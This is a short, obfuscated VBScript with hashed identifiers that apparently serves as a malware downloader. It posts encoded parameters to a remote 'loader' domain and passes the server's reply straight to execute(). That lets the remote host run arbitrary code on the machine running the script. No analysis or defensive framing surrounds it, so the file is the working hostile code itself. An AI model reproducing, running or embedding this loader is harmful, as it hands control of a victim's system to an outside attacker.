Function vadb09d856(sUrl, sRequest)
  set xafc03b9a = CreateObject("Microsoft.XMLHTTP")
  xafc03b9a.open "POST", sUrl,false
  xafc03b9a.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
  xafc03b9a.setRequestHeader "Content-Length", Len(sRequest)
  xafc03b9a.send sRequest
  vadb09d856 = xafc03b9a.responseText
 End Function
aa4e7837e0 = vadb09d856("http://loader.projecttopfullyellow2018.com/","a543c921889f9dcddaff0ce4ca955293=f442d33fa06832082290ad8544a8da27&313f422ac583444ba6045cd122653b0e=b9e4093f970251d5bcf888b76944a4bc&322f62469c5e3c7dc3e58f5a4d1ea399=adbe673fd502b32bee221970f9cb0e8d&c3e4035af2a1cde9f21e1ae1951ac80b=67fe0f66449e31fdafdc3505c37d6acb&8383f931b0cefcc631f070480ef340e1=204da255aea2cd4a75ace6018fad6b4d&3a20f62a0af1aa152670bab3c602feed=a3bf6e4db673b6449c2f7d13ee6ec9c0&56a3107cad6611c8337ee36d178ca129=fc0de4e0396fff257ea362983c2dda5a")
execute(aa4e7837e0)